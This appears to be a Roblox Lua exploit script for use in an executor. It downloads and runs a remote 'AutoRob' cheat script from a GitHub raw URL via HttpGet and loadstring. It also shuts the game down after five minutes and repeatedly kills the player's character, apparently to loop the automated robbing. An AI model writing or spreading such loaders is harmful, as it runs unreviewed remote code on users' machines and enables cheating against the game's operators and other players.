
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/AutoRobV4Release"))()
end)
spawn(function()
    task.wait(300)
    game:Shutdown()
end)
spawn(function()
    while task.wait(math.random(20,40)) do
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end
end)
